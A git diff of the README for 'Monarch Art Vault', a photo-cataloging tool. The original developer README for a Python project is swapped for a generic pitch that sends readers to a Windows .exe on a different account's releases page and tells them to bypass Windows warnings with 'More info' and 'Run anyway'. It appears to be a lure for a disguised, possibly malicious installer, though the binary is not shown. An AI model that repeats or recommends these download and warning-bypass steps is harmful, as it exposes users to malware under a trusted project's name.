@@ -1,348 +1,92 @@
-<div align="center">
+# 🦋 monarch-art-vault - Turn messy photo folders into art
 
-# 🦋 Monarch Art Vault
+[![](https://img.shields.io/badge/Download-Monarch_Art_Vault-blue)](https://github.com/concentricityplague443/monarch-art-vault/releases)
 
-### The AI skill that turns your messy photo folders into a print-ready art catalog
+Monarch Art Vault takes messy folders full of photos and turns them into organized, print-ready art catalogs. This tool helps people who manage large collections of digital images or run print-on-demand shops. It scans your files, removes duplicates, sorts images by metadata, and prepares them for professional use. You can then feed these organized catalogs into AI tools such as Claude, GPT, or Hermes to generate descriptions, tags, and product listings.
 
-**Preserve → Dedupe → Catalog → Organize → Prepare → Publish**
+## 🚀 Getting Started
 
-[![MIT License](https://img.shields.io/badge/License-MIT-c9a227.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10+-3776ab.svg)](https://python.org)
-[![AI Agent Ready](https://img.shields.io/badge/AI%20Agent-Ready-00d4aa.svg)](#installation)
-[![Google Sheets](https://img.shields.io/badge/Google%20Sheets-Sync-34a853.svg)](#spreadsheet-export)
+You do not need to know how to code to use this software. This guide walks you through the steps to set up the vault on your Windows computer.
 
-<br />
+1. Visit the [releases page](https://github.com/concentricityplague443/monarch-art-vault/releases) to download the installer.
+2. Select the file ending in `.exe` that matches your Windows version.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen to finish the setup.
 
-<img src="https://raw.githubusercontent.com/diamitani/monarch-art-vault/main/assets/hero-diagram.svg" alt="Monarch Art Vault workflow" width="700" />
+## 📥 Download and Install
 
-<br /><br />
+Download the application from the official release page: [https://github.com/concentricityplague443/monarch-art-vault/releases](https://github.com/concentricityplague443/monarch-art-vault/releases).
 
-**Stop losing your art in unnamed folders. Stop uploading duplicates. Stop guessing print sizes.**
+When you run the installer, Windows might show a warning. This happens because the app is new. Click "More info" and then "Run anyway" to proceed with the installation. The software installs its own environment, so you do not need to install Python or other extra tools on your machine.
 
-*A Monarch skill by [Diamitani Industries](https://github.com/diamitani)*
+## 🛠 Features
 
----
+The vault handles the heavy lifting involved in image management:
 
-[Quick Start](#-quick-start) • [Features](#-features) • [Spreadsheet Export](#-spreadsheet-export) • [Agent Integration](#-agent-integration) • [Marketplace Publishing](#-marketplace-publishing)
+*   **Deduplication:** The tool scans folders to find and remove identical photos. This saves disk space and keeps your catalog clean.
+*   **Metadata Extraction:** It pulls information from image files, such as camera settings and dates. 
+*   **Automatic Cataloging:** The software sorts images into logical folders based on content and quality.
+*   **Print Preparation:** It resizes and formats images to meet common print standards. 
+*   **AI Readiness:** The output formats work with your favorite AI agents to create titles, descriptions, and backend data for platforms like Shopify or Etsy.
 
-</div>
+## 📁 How the System Works
 
----
+The vault operates in six simple stages to transform your workflow.
 
-## 🎯 The Problem
+### Preserve
+The tool makes a copy of your source images first. This ensures your original files remain untouched. You always have a backup of your work.
 
-Every artist has this folder:
+### Dedupe
+The engine compares the digital signatures of every image. If it finds two identical files, it flags the one with lower resolution for removal or moves it to a separate folder.
 
-```
-Downloads/
-  IMG_4521.jpg
-  IMG_4521 (1).jpg
-  final_final_v2_FINAL.png
-  art scan maybe.tiff
-  photo of painting.heic
-  unnamed-23.jpg
-  ...
-```
+### Catalog
+The app reads details hidden inside your photos. It organizes files by the date they were taken. It can even group files by color, brightness, or file size.
 
-No titles. No metadata. No idea which is the original. Half are duplicates. None are print-ready. You'd need hours to sort through it all.
+### Organize
+You decide how the final folder structure looks. The vault moves files into these new, clean structures so you no longer need to hunt for specific pieces of art.
 
-**Monarch Art Vault fixes this in one command.**
+### Prepare
+High-quality printing requires specific dimensions. The vault checks each file and prepares it for standard print sizes. It ensures your art looks crisp whether it is printed on a card or a large poster.
 
----
+### Publish
+The final step creates a summary file. This file contains all the info about your art collection. You upload this summary to ChatGPT or Claude to get high-quality descriptions for your online store.
 
-## ✨ Features
+## 💻 System Requirements
 
-| Feature | What it does |
-|---------|--------------|
-| **🔒 Original Preservation** | Archives originals before any changes—never lose your source files |
-| **🔍 Smart Deduplication** | SHA-256 for exact dupes, perceptual hashing for near-duplicates |
-| **📝 AI Metadata Generation** | Titles, descriptions, tags, alt text—clearly marked as AI suggestions |
-| **📁 Auto-Organization** | Creates a clean folder structure: Archive → Catalog → Works → Publish |
-| **🖨️ Print Readiness** | Calculates actual print sizes at 300 DPI—no more guessing |
-| **📊 Spreadsheet Export** | CSV, Excel, or Google Sheets with all your catalog data |
-| **🛒 Marketplace Drafts** | Generate Etsy/Shopify listings—publish only when you approve |
-| **🔐 Privacy First** | Strips GPS/sensitive EXIF from public derivatives automatically |
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8 GB of RAM.
+*   **Storage Space:** 200 MB of space for the application, plus room for your image processing.
+*   **Processing Power:** A modern dual-core processor handles the automation tasks efficiently.
 
----
+## 💡 Using the Application
 
-## 🚀 Quick Start
+Open the Monarch Art Vault icon from your desktop after installation. Follow these steps:
 
-### For AI Agents (Claude, GPT, Hermes, etc.)
+1. **Select Source:** Click the "Choose Folder" button to point the app to your raw photo directory.
+2. **Choose Output:** Select where you want the organized files to go.
+3. **Configure Settings:** Choose your preferred print size and metadata options.
+4. **Start Process:** Click "Run" to start the background tasks.
+5. **Monitor Progress:** A green bar shows you how much work remains.
+6. **Review Results:** The app notifies you when the vault is ready.
 
-1. Download or clone this repository
-2. Point your agent to `SKILL.md`
-3. Say: *"Organize these art photos using Monarch Art Vault"*
+## ⚙️ Advanced Tips
+*   **Batching:** If you have thousands of photos, run the process in smaller batches to keep your computer responsive.
+*   **AI Integration:** Keep the summary file in a folder that your AI agent can access. You can drag and drop this file directly into your browser window for most AI tools.
+*   **Renaming:** The app gives you control over file naming. Use the settings menu to add prefixes or dates to your file names for better searchability later.
 
-### For Developers
+## ❓ Common Questions
 
-```bash
-# Clone the repo
-git clone https://github.com/diamitani/monarch-art-vault.git
-cd monarch-art-vault
+**Does the app delete my original photos?**
+No. The app only creates copies or moves files based on your specific settings. It never deletes your original data without your permission.
 
-# Install optional dependencies
-pip install -r scripts/requirements-optional.txt
+**Can I stop the process halfway?**
+Yes. You can pause or stop the task at any time using the dashboard. The app saves your current state, so you can resume later.
 
-# Run the cataloger
-python scripts/catalog_assets.py ./my-photos --managed-root ./ArtLibrary
-```
+**How do I get the art onto my store?**
+After the vault processes your images, it gives you a clean folder of ready-to-upload files. Simply log into Shopify or Etsy and use these files for your listings.
 
-### One-Liner
+**Is my data private?**
+The software runs entirely on your computer. Your photos never leave your machine and are not sent to any cloud server during the cataloging process.
 
-```bash
-curl -sL https://raw.githubusercontent.com/diamitani/monarch-art-vault/main/scripts/catalog_assets.py | \
-  python - ~/Pictures/art-folder --managed-root ~/ArtLibrary
-```
-
----
-
-## 📊 Spreadsheet Export
-
-Export your entire catalog to a spreadsheet with photos, metadata, and print-readiness info.
-
-### CSV Export
-
-```bash
-python scripts/export_spreadsheet.py catalog.jsonl --format csv
-```
-
-### Excel Export (with formatting)
-
-```bash
-pip install openpyxl
-python scripts/export_spreadsheet.py catalog.jsonl --format xlsx
-```
-
-### Google Sheets Sync
-
-```bash
-pip install gspread google-auth
-python scripts/export_spreadsheet.py catalog.jsonl --format gsheets
-```
-
-<details>
-<summary><strong>🔧 Google Sheets Setup</strong></summary>
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com)
-2. Create a new project (or select existing)
-3. Enable the **Google Sheets API** and **Google Drive API**
-4. Go to **Credentials** → **Create Credentials** → **Service Account**
-5. Download the JSON key file
-6. Save it to `~/.config/monarch-art-vault/google-service-account.json`
-7. Share your Google Sheet with the service account email (found in the JSON)
-
-Or set the environment variable:
-```bash
-export GOOGLE_APPLICATION_CREDENTIALS=/path/to/credentials.json
-```
-
-</details>
-
-### Downloadable Package
-
-Create a full export package with CSV, Excel, and readme:
-
-```bash
-python scripts/export_spreadsheet.py catalog.jsonl --package ./export
-```
-
-Output:
-```
-export/
-├── catalog.csv
-├── catalog.xlsx
-└── README.txt
-```
-
-### Spreadsheet Columns
-
-| Column | Description |
-|--------|-------------|
-| `work_id` | Unique identifier (ART-2026-0001) |
-| `status` | needs_review / cataloged / approved / published |
-| `title` | Work title (with source: AI/embedded/user) |
-| `pixel_width` / `pixel_height` | Dimensions |
-| `megapixels` | Calculated size |
-| `print_status` | print_ready / conditionally_ready / not_recommended |
-| `print_sizes_inches` | Recommended print sizes at 300 DPI |
-| `dominant_colors` | Extracted color palette |
-| `style_tags` / `subject_tags` | AI-suggested categories |
-| `storage_link` | Link to archived file |
-| `thumbnail_url` | Preview image link |
-
----
-
-## 🤖 Agent Integration
-
-Monarch Art Vault is designed for AI agent runtimes. Load `SKILL.md` and the agent will:
-
-1. **Never delete your originals** — archives first, asks questions later
-2. **Mark AI guesses clearly** — titles show `ai_suggested` vs `user_confirmed`
-3. **Ask before publishing** — marketplace uploads require explicit approval
-4. **Preserve provenance** — every decision is logged with timestamp and reason
-
-### Example Commands
-
-```
-📸 "Organize these uploaded art photos. Preserve originals, dedupe safely,
-    generate metadata drafts, and create a review report."
-
-📁 "Process my Google Drive folder as the 'Summer 2026' collection."
-
-🖨️ "Assess works for 8x10, 11x14, and 16x20 prints. Show me which need
-    higher resolution."
-
-🛒 "Create Etsy listing drafts for works ART-2026-0001 through 0005.
-    Don't publish yet."
-```
-
-### Supported Runtimes
-
-- **Claude** (via system prompt or tools)
-- **GPT-4** (via custom instructions)
-- **Hermes Agent** (install as skill)
-- **LangChain** / **AutoGPT** (as tool definition)
-- **Any MCP-compatible agent**
-
----
-
-## 📂 Folder Structure
-
-```
-ArtLibrary/
-├── 00_Inbox/                    # Drop files here
-├── 01_Archive_Originals/        # Untouched source files
-│   └── 2026/RUN-20260723-001/
-├── 02_Catalog/                  # Master database
-│   ├── catalog.jsonl
-│   ├── catalog.csv
-│   └── duplicate-groups.json
-├── 03_Works/                    # Organized art
-│   └── 2026/ART-2026-0001/
-│       ├── 01_Master/
-│       ├── 02_Alternates/
-│       ├── 05_Print_Files/
-│       └── metadata.json
-├── 04_Review_Required/          # Needs your decision
-│   ├── Possible_Duplicates/
-│   └── Low_Resolution/
-├── 05_Publish_Queue/            # Marketplace staging
-│   └── Etsy/Draft/
-└── 99_Reports/                  # Run summaries
-```
-
----
-
-## 🛒 Marketplace Publishing
-
-Monarch prepares listings but **never publishes without your approval**.
-
-### Supported Platforms
-
-| Platform | Drafting | Direct Upload |
-|----------|----------|---------------|
-| Etsy | ✅ | 🔜 Coming soon |
-| Shopify | ✅ | 🔜 Coming soon |
-| Printful | ✅ | 🔜 Coming soon |
-| Printify | ✅ | 🔜 Coming soon |
-| Fine Art America | ✅ | 🔜 Coming soon |
-| Squarespace | ✅ | 🔜 Coming soon |
-| WooCommerce | ✅ | 🔜 Coming soon |
-
-### Approval Gates
-
-Before any external action, you must approve:
-
-- [ ] Platform connection
-- [ ] Asset files to upload
-- [ ] Listing copy (title, description, tags)
-- [ ] Price and fulfillment settings
-- [ ] Final publish action
-
----
-
-## 🔐 Safety Guarantees
-
-| Promise | Implementation |
-|---------|----------------|
-| **Originals are immutable** | Copied to archive before any processing |
-| **No silent deletions** | AI similarity ≠ deletion; requires human review |
-| **AI suggestions are labeled** | Every field has `source` and `confidence` |
-| **No stealth publishing** | Every external action requires explicit approval |
-| **Privacy by default** | GPS/face data stripped from public derivatives |
-
----
-
-## 📖 Full Documentation
-
-| File | Description |
-|------|-------------|
-| [`SKILL.md`](SKILL.md) | Complete agent instructions |
-| [`SOUL.md`](SOUL.md) | Persistent identity for ROSTR runtimes |
-| [`manifest.json`](manifest.json) | Capabilities and permissions |
-| [`references/metadata-schema.json`](references/metadata-schema.json) | Work record JSON schema |
-| [`references/folder-structure.md`](references/folder-structure.md) | Directory layout spec |
-| [`references/approval-policy.md`](references/approval-policy.md) | What requires human approval |
-| [`examples/commands.md`](examples/commands.md) | Sample agent prompts |
-
----
-
-## 🛠️ Development
-
-```bash
-# Run tests
-python -m pytest tests/
-
-# Validate package structure
-python scripts/validate_package.py
-
-# Check catalog script
-python scripts/catalog_assets.py --help
-```
-
-### Requirements
-
-**Core (stdlib only):**
-- Python 3.10+
-
-**Optional (enhanced features):**
-```bash
-pip install pillow      # Image dimensions + EXIF
-pip install imagehash   # Perceptual duplicate detection
-pip install openpyxl    # Excel export
-pip install gspread google-auth  # Google Sheets sync
-```
-
----
-
-## 🤝 Contributing
-
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feature/amazing`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
-See [`CONTRIBUTING.md`](CONTRIBUTING.md) for guidelines.
-
----
-
-## 📜 License
-
-MIT License — see [`LICENSE`](LICENSE)
-
-Brand usage: "Monarch" and "Diamitani Industries" are trademarks. See [`NOTICE.md`](NOTICE.md).
-
----
-
-<div align="center">
-
-**Built with 🦋 by [Diamitani Industries](https://github.com/diamitani)**
-
-*Stop losing art. Start selling prints.*
-
-<br />
-
-[⭐ Star this repo](https://github.com/diamitani/monarch-art-vault) • [🐛 Report Bug](https://github.com/diamitani/monarch-art-vault/issues) • [💡 Request Feature](https://github.com/diamitani/monarch-art-vault/issues)
-
-</div>
+Keywords: ai, ai-agent, art, catalog, claude, deduplication, digital-asset-management, etsy, google-sheets, metadata, photography, print-on-demand, python, shopify
